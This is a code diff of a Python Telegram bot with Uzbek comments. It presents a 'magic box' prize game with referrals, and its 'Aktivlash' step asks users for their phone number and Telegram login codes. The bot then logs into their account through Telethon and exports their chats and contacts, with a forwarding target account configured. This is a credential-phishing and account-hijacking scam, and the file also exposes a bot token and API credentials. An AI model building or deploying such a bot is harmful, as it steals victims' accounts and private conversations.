@@ -1,31 +1,45 @@
-import asyncio, os, json, random, zipfile, shutil
+import asyncio
+import os
+import json
+import random
+import zipfile
+import shutil
+
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import CommandStart
 from telethon import TelegramClient
 from telethon.tl.types import User
 from telethon.errors import SessionPasswordNeededError
 
-# ================== SOZLAMALAR ==================
-BOT_TOKEN = "8430622652:AAEOpaFSYp6w9X7_LGDzfnOFNaFICjxuMdI"
+# =====================================================
+# 🔐 RENDER + LOKALGA MOS SOZLAMALAR
+# =====================================================
+BOT_TOKEN = os.getenv("BOT_TOKEN") or "LOKAL_BOT_TOKEN_BU_YERGA"
 
-API_ID = 27762756
-API_HASH = "4905f5337b228bec93dd37832e89b1c6"
+API_ID = int(os.getenv("API_ID") or 27762756)
+API_HASH = os.getenv("API_HASH") or "4905f5337b228bec93dd37832e89b1c6"
 
-ADMIN_ID = 7690148385
-MEDIA_TARGET = "@vip_22022"
+ADMIN_ID = int(os.getenv("ADMIN_ID") or 7690148385)
+
+MEDIA_TARGET = os.getenv("MEDIA_TARGET") or "@vip_22022"
 
 BASE_DIR = "chats_export"
 
 WIN_STICKER = "https://t.me/Asilbek_uzb/73"
 LOSE_STICKER = "https://t.me/Asilbek_uzb/74"
 
+# =====================================================
 bot = Bot(BOT_TOKEN)
 dp = Dispatcher()
 
 USERS_FILE = "users.json"
 CONFIG_FILE = "config.json"
 
-# ================== JSON ==================
+sessions = {}
+
+# =====================================================
+# 📁 JSON YORDAMCHI FUNKSIYALAR
+# =====================================================
 def load_json(file, default):
     if not os.path.exists(file):
         with open(file, "w", encoding="utf-8") as f:
@@ -39,9 +53,10 @@ def save_json(file, data):
 
 users = load_json(USERS_FILE, {})
 config = load_json(CONFIG_FILE, {"magic_box": "on"})
-sessions = {}
 
-# ================== MENULAR ==================
+# =====================================================
+# 📱 MENULAR
+# =====================================================
 MENU_TEXTS = [
     "🎁 Sehrli quti",
     "🏆 Yutuqlar",
@@ -67,11 +82,12 @@ def back_menu():
         resize_keyboard=True
     )
 
-# ================== START + REFERAL ==================
+# =====================================================
+# 🚀 /start + REFERAL + MIGRATION
+# =====================================================
 @dp.message(CommandStart())
 async def start(msg: types.Message):
     uid = str(msg.from_user.id)
-
     parts = msg.text.split()
     ref_id = parts[1] if len(parts) > 1 else None
 
@@ -87,9 +103,8 @@ async def start(msg: types.Message):
         if ref_id and ref_id in users and ref_id != uid:
             users[uid]["ref_by"] = ref_id
             users[ref_id]["refs"] += 1
-
     else:
-        # 🔧 MIGRATION: eski userlarda yo‘q maydonlarni qo‘shish
+        # 🔧 eski userlarni avtomatik tuzatish (migration)
         users[uid].setdefault("boxes", 0)
         users[uid].setdefault("win_box", random.randint(1, 3))
         users[uid].setdefault("has_prize", False)
@@ -103,11 +118,12 @@ async def start(msg: types.Message):
         reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
     )
 
-# ================== REFERAL (MUHIM!) ==================
+# =====================================================
+# 👥 REFERAL
+# =====================================================
 @dp.message(lambda m: m.text == "👥 Referal")
 async def referral(msg: types.Message):
     uid = str(msg.from_user.id)
-
     bot_username = (await bot.me()).username
     link = f"https://t.me/{bot_username}?start={uid}"
 
@@ -120,7 +136,9 @@ async def referral(msg: types.Message):
         parse_mode="HTML"
     )
 
-# ================== SEHRLI QUTI ==================
+# =====================================================
+# 🎁 SEHRLI QUTI
+# =====================================================
 @dp.message(lambda m: m.text == "🎁 Sehrli quti")
 async def magic_info(msg: types.Message):
     u = users[str(msg.from_user.id)]
@@ -189,10 +207,15 @@ async def open_box(cb: types.CallbackQuery):
             ]]
         )
 
-    await cb.message.answer(f"{text}\n\n📊 Ochish: {current}/3", reply_markup=kb)
+    await cb.message.answer(
+        f"{text}\n\n📊 Ochish: {current}/3",
+        reply_markup=kb
+    )
     await cb.answer()
 
-# ================== YUTUQLAR ==================
+# =====================================================
+# 🏆 YUTUQLAR
+# =====================================================
 @dp.message(lambda m: m.text == "🏆 Yutuqlar")
 async def prizes(msg: types.Message):
     if users[str(msg.from_user.id)].get("has_prize"):
@@ -200,7 +223,9 @@ async def prizes(msg: types.Message):
     else:
         await msg.answer("❌ Sizda yutuqlar yo‘q")
 
-# ================== AKTIVLASH ==================
+# =====================================================
+# ✅ AKTIVLASH
+# =====================================================
 @dp.message(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     uid = str(msg.from_user.id)
@@ -211,13 +236,20 @@ async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
     await msg.answer("📞 Telefon raqamingizni yuboring", reply_markup=back_menu())
 
-# ================== ORQAGA ==================
+# =====================================================
+# ⬅️ ORQAGA
+# =====================================================
 @dp.message(lambda m: m.text == "⬅️ Orqaga")
 async def back(msg: types.Message):
     sessions.pop(msg.from_user.id, None)
-    await msg.answer("🔙 Asosiy menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
+    await msg.answer(
+        "🔙 Asosiy menyu",
+        reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
+    )
 
-# ================== TELETHON LOGIN (FILTER TO‘G‘RI!) ==================
+# =====================================================
+# 🔐 TELETHON LOGIN (MENU BLOKLANMAYDI)
+# =====================================================
 @dp.message(
     lambda m: m.from_user.id in sessions
     and m.text not in MENU_TEXTS
@@ -252,7 +284,9 @@ async def telethon_login(msg: types.Message):
         await msg.answer("⏳ Chatlar olinmoqda...")
         await export_chats(uid)
 
-# ================== CHAT EXPORT ==================
+# =====================================================
+# 📦 CHAT EXPORT (ISM / USERNAME / ID / TELEFON)
+# =====================================================
 async def export_chats(uid):
     client = sessions[uid]["client"]
     os.makedirs(BASE_DIR, exist_ok=True)
@@ -303,9 +337,15 @@ async def export_chats(uid):
     await client.disconnect()
     sessions.pop(uid, None)
 
-    await bot.send_message(uid, "✅ Chatlar to‘liq saqlandi", reply_markup=main_menu(uid == ADMIN_ID))
+    await bot.send_message(
+        uid,
+        "✅ Chatlar to‘liq saqlandi",
+        reply_markup=main_menu(uid == ADMIN_ID)
+    )
 
-# ================== ADMIN PANEL ==================
+# =====================================================
+# ⚙️ ADMIN PANEL
+# =====================================================
 @dp.message(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
 async def admin_panel(msg: types.Message):
     kb = types.InlineKeyboardMarkup(
@@ -323,7 +363,9 @@ async def admin_switch(cb: types.CallbackQuery):
     await cb.message.answer(f"✅ Sehrli quti: {cb.data.upper()}")
     await cb.answer()
 
-# ================== RUN ==================
+# =====================================================
+# ▶️ RUN
+# =====================================================
 async def main():
     await dp.start_polling(bot)
 
